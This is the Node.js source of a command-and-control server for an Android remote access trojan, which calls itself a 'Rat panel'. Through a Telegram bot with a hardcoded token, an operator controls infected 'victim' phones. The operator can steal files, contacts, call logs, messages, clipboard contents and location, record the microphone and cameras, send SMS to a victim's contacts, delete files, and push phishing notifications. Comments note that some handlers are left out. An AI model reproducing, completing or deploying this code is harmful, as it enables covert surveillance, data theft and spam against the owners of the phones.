const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = process.env.TELEGRAM_BOT_TOKEN || '8400168149:AAGmeG05HdxkGzQvZGaM986EeLKY8bERtnU'
const id = process.env.TELEGRAM_CHAT_ID || '1928177934'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">Server uploaded successfully</h1> <br> <p style="font-size:14px; text-align:center; color:red;">T.G Channel: <a href="https://youtube.com/@tech-cipher-789?si=KKFxdeptQefT8-6t">@Balaram</a></p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `Message from <b>${req.headers.model}</b> device`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `Message from <b>${req.headers.model}</b> device\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `Location from <b>${req.headers.model}</b> device`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `New device connected\n\n` +
        `Device model : <b>${model}</b>\n` +
        `Battery : <b>${battery}</b>\n` +
        `Android version : <b>${version}</b>\n` +
        `Screen brightness : <b>${brightness}</b>\n` +
        `Provider : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `Device disconnected\n\n` +
            `Device model : <b>${model}</b>\n` +
            `Battery : <b>${battery}</b>\n` +
            `Android version : <b>${version}</b>\n` +
            `Screen brightness : <b>${brightness}</b>\n` +
            `Provider : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('Please reply the number to which you want to send the SMS')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                'Great, now enter the message you want to send to this number\n\n' +
                'Be careful that the message will not be sent if the number of characters in your message is more than allowed',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('Great, now enter the message you want to send to this number')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter the message you want to send to all contacts')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter the path of the file you want to download')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter the path of the file you want to delete')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter how long you want the microphone to be recorded')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter how long you want the main camera to be recorded')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter how long you want the selfie camera to be recorded')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter the message that you want to appear on the target device')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter the message you want to appear as notification')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                'Great, now enter the link you want to be opened by the notification\n\n' +
                'When the victim clicks on the notification, the link you are entering will be opened',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('Great, now enter the link you want to be opened by the notification')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Enter the audio link you want to play')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Your request is on process\n\n' +
                'You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'Welcome to Rat panel\n\n' +
                'If the application is installed on the target device, wait for the connection\n\n' +
                'When you receive the connection message, it means that the target device is connected and ready to receive the command\n\n' +
                'Click on the command button and select the desired device then select the desired command among the commands\n\n' +
                'If you get stuck somewhere in the bot, send /start command',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'Connected devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'No connecting devices available\n\n' +
                    'Make sure the application is installed on the target device'
                )
            } else {
                let text = 'List of connected devices :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `Device model : <b>${value.model}</b>\n` +
                        `Battery : <b>${value.battery}</b>\n` +
                        `Android version : <b>${value.version}</b>\n` +
                        `Screen brightness : <b>${value.brightness}</b>\n` +
                        `Provider : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Execute command') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'No connecting devices available\n\n' +
                    'Make sure the application is installed on the target device'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, 'Select device to execute command', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, 'Permission denied')
    }
})

// ... rest of the callback_query handlers (same pattern - remove Unicode)

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    
    if (commend == 'device') {
        appBot.editMessageText(`Select command for device : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Apps', callback_data: `apps:${uuid}`},
                        {text: 'Device info', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Get file', callback_data: `file:${uuid}`},
                        {text: 'Delete file', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: 'Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Main camera', callback_data: `camera_main:${uuid}`},
                        {text: 'Selfie camera', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'Location', callback_data: `location:${uuid}`},
                        {text: 'Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Calls', callback_data: `calls:${uuid}`},
                        {text: 'Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
                        {text: 'Show notification', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Messages', callback_data: `messages:${uuid}`},
                        {text: 'Send message', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Play audio', callback_data: `play_audio:${uuid}`},
                        {text: 'Stop audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Send message to all contacts',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    
    // All other callback handlers remain the same but with normal text
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Your request is on process\n\n' +
            'You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute command"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    // ... Continue with all other callback handlers (same logic, just remove Unicode)
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

appServer.listen(process.env.PORT || 8999);
